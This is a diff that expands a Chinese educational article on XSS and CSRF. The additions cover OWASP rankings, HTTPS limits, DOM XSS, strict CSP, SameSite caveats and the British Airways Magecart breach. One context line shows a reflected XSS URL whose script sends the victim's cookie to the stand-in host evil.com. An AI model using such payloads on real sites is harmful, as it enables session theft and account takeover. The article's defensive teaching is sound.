@@ -2,7 +2,7 @@
 title: Web 安全：XSS 与 CSRF
 title_en: "Web Security: XSS and CSRF"
 status: published
-updated: 2026-06-13
+updated: 2026-06-28
 category: 安全
 order: 57
 field: 计算机科学 · 网络安全
@@ -30,6 +30,16 @@ Web 应用的安全本质上是**信任边界**的问题：浏览器信任来自
 
 XSS 攻击同源策略（Same-Origin Policy），CSRF 攻击会话认证机制。这两类攻击长期占据 OWASP（开放网络应用安全项目）Top 10 漏洞榜单，影响范围从个人账户到企业系统。
 
+具体到排名：OWASP Top 10 的 2017 版里，注入（Injection）高居第一，XSS 单独位列第七。2021 版做了一次重要归并——XSS 被并入 A03「注入」大类，整体落到第三名。这不是因为 XSS 变少了，而是 OWASP 认定它本质上就是一种注入：把脚本注入到受害者的浏览器里执行。
+
+### 一个常见误解：HTTPS 不能阻止 XSS 与 CSRF
+
+很多人以为网站上了 HTTPS 就万事大吉。这其实混淆了两个不同的层次。
+
+HTTPS（TLS）保护的是**传输层**：它防止数据在网络途中被窃听或篡改，并验证你连接的确实是 `bank.com` 本身。但 XSS 和 CSRF 都是**应用层**漏洞，发生在数据已经安全抵达浏览器或服务器**之后**。
+
+一段被注入的脚本，照样能在加密连接里执行；一个伪造的转账请求，照样能带着合法 Cookie 通过 HTTPS 发出去。加密只保证「没人在路上动手脚」，并不保证「送达的内容本身是善意的」。把传输安全当成应用安全，是 Web 安全里最常见的认知错位。
+
 ## XSS：跨站脚本攻击
 
 **核心机制**：攻击者设法把恶意 JavaScript 注入到目标网站的页面，当受害者访问该页面时，浏览器执行这段脚本——以该网站的权限运行。攻击者可以读取 Cookie、会话 Token、输入内容，甚至以受害者身份发起请求。
@@ -51,6 +61,10 @@ https://example.com/search?q=<script>document.location='https://evil.com/?cookie
 document.getElementById('output').innerHTML = location.hash.substring(1);
 ```
 
+DOM 型 XSS 由安全研究者 Amit Klein 在 2005 年首次系统描述，他称之为「第三种 XSS」（XSS of the Third Kind）。它特别隐蔽：上面例子里的 `location.hash`（URL 中 `#` 之后的片段）按规范根本不会被发送到服务器，因此服务器端的输入过滤、Web 应用防火墙、输出编码统统看不到这段攻击载荷。
+
+防御 DOM 型 XSS 必须落在客户端代码本身——避免用 `innerHTML`、`document.write`、`eval` 处理不可信数据，改用 `textContent` 等不会把字符串当 HTML 解析的接口。
+
 ### 防御 XSS
 
 **输出编码**：在把用户提供的数据插入 HTML 之前，对特殊字符（`<`、`>`、`&`、`"`、`'`）做 HTML 实体编码。现代模板引擎（React、Vue 的默认行为）自动做这件事——这是过去十年 XSS 显著减少的最主要原因。
@@ -60,6 +74,8 @@ document.getElementById('output').innerHTML = location.hash.substring(1);
 ```
 Content-Security-Policy: script-src 'self' https://trusted.cdn.com
 ```
+
+CSP 的设想可追溯到 2004 年，由 Mozilla 推动落地并在 Firefox 4 中首次实现；W3C 于 2012 年 11 月发布 CSP 1.0 候选推荐，2016 年的 Level 2 引入了 `nonce`（一次性随机值）与哈希白名单。值得注意的是，基于域名白名单的 CSP 在实践中常被绕过（详见下文「代价与争议」），因此现代最佳实践已转向基于 `nonce` 与 `'strict-dynamic'` 的「严格 CSP」——只信任带有正确一次性随机标记的脚本，而不再依赖一长串易出错的域名清单。
 
 **HttpOnly Cookie**：把会话 Cookie 标记为 `HttpOnly`，浏览器的 JavaScript 无法读取它，即使发生 XSS，攻击者也无法窃取 Cookie。
 
@@ -77,7 +93,7 @@ Content-Security-Policy: script-src 'self' https://trusted.cdn.com
 
 ### 防御 CSRF
 
-**CSRF Token**：服务器为每个表单生成一个随机令牌，嵌入 HTML，要求提交时带上这个令牌。攻击者的页面无法读取另一个域的 HTML（同源策略），因此无法获取合法 Token。这是目前最通用的防御手段。
+**CSRF Token**：服务器为每个表单生成一个随机令牌，嵌入 HTML，要求提交时带上这个令牌。攻击者的页面无法读取另一个域的 HTML（同源策略），因此无法获取合法 Token。这套机制的标准名称是「同步器令牌模式」（synchronizer token pattern），是目前最通用的防御手段。
 
 **SameSite Cookie**：现代浏览器支持 `SameSite` Cookie 属性：设置为 `Strict` 时，跨站请求不携带该 Cookie；设置为 `Lax` 时，只有顶层导航的 GET 请求才携带：
 
@@ -85,7 +101,9 @@ Content-Security-Policy: script-src 'self' https://trusted.cdn.com
 Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
 ```
 
-Chrome 80（2020）起将 SameSite 默认值改为 `Lax`，这一改变大幅降低了 CSRF 的攻击面。
+Chrome 80 于 2020 年 2 月起将无 SameSite 属性的 Cookie 默认按 `Lax` 处理，这一改变大幅降低了 CSRF 的攻击面。
+
+但 `SameSite` 不是银弹，不能完全取代 CSRF Token。`Lax` 仍然允许跨站的顶层 GET 导航携带 Cookie，对「点击链接即触发副作用」的接口仍有风险；老旧浏览器可能根本不支持该属性；而且「同站」（same-site）不等于「同源」，同一站点下被攻陷的子域仍可能绕过限制。因此严谨的做法是把 `SameSite` 与 CSRF Token 叠加使用，构成纵深防御。
 
 **双重提交 Cookie**：把 CSRF Token 同时存入 Cookie 和表单，服务器验证二者是否一致——即使不需要服务器存储 Token 也能防护。
 
@@ -100,11 +118,11 @@ Chrome 80（2020）起将 SameSite 默认值改为 `Lax`，这一改变大幅降
 
 ## 代价与争议
 
-**CSP 的部署困难**：严格的 CSP 策略能有效防止 XSS，但现代 Web 应用往往加载来自多个 CDN、分析服务、广告平台的脚本，维护精确的白名单极其繁琐，导致许多网站的 CSP 策略过于宽松。Google 的研究（2016）发现，95% 的已部署 CSP 策略可以被绕过。
+**CSP 的部署困难**：严格的 CSP 策略能有效防止 XSS，但现代 Web 应用往往加载来自多个 CDN、分析服务、广告平台的脚本，维护精确的白名单极其繁琐，导致许多网站的 CSP 策略过于宽松。Google 安全团队的研究（Weichselbaum 等，论文题为《CSP Is Dead, Long Live CSP!》，ACM CCS 2016）分析了约 168 万个使用 CSP 的站点，发现其中约 94.7% 的策略可以被绕过，99% 以上站点的 CSP 对 XSS 几乎没有实质防护。论文的结论正是：放弃域名白名单，改用前文提到的基于 `nonce` 的严格 CSP。
 
 **移动端 API 的 CSRF**：纯 JSON API 不使用表单提交，通常用 Bearer Token（而非 Cookie）认证，天然免疫 CSRF——但也带来了 Token 存储安全的新问题（LocalStorage 可被 XSS 读取；Cookie 又需要防 CSRF）。
 
-**第三方脚本的供应链风险**：2018 年 British Airways 数据泄露事件，攻击者篡改了支付页面用到的第三方 JavaScript 库（Modernizr），把约 38 万名客户提交的信用卡信息实时回传到攻击者服务器（监管认定受影响个人逾 40 万）——XSS 变种中最难防范的是这类供应链攻击（Magecart）。
+**第三方脚本的供应链风险**：2018 年 British Airways 数据泄露事件，攻击者篡改了支付页面用到的第三方 JavaScript 库（一个 2012 年的旧版 Modernizr），追加一段脚本把约 38 万名客户提交的信用卡信息实时回传到攻击者服务器（监管认定受影响个人逾 40 万）——XSS 变种中最难防范的是这类供应链攻击（Magecart）。英国信息专员办公室（ICO）最初提议处以 1.83 亿英镑的创纪录罚款，后因新冠疫情对航空业的冲击，于 2020 年 10 月降至 2000 万英镑。
 
 ## 跨域连接
 
@@ -119,6 +137,10 @@ Chrome 80（2020）起将 SameSite 默认值改为 `Lax`，这一改变大幅降
 
 - Stamm, S., Sterne, B., Markham, G. *Reining in the Web with Content Security Policy.* WWW 2010.
 - West, M. *Same-Site Cookies.* RFC/Internet-Draft, 2016.（SameSite Cookie 机制的规范背景）
+- Weichselbaum, L., Spagnuolo, M., Lekies, S., Janc, A. *CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy.* ACM CCS 2016.（约 168 万站点的 CSP 绕过实证研究）
+- Klein, A. *DOM Based Cross Site Scripting or XSS of the Third Kind.* Web Application Security Consortium, 2005.（DOM 型 XSS 的首次系统描述）
+- OWASP. *OWASP Top 10:2021 — A03:2021 Injection（含 XSS, CWE-79）.* owasp.org/Top10/2021/A03_2021-Injection.
+- W3C. *Content Security Policy Level 2.* W3C Recommendation, 2016-12-15.（`nonce`/哈希白名单的规范来源）
 
 ## 延伸阅读
 
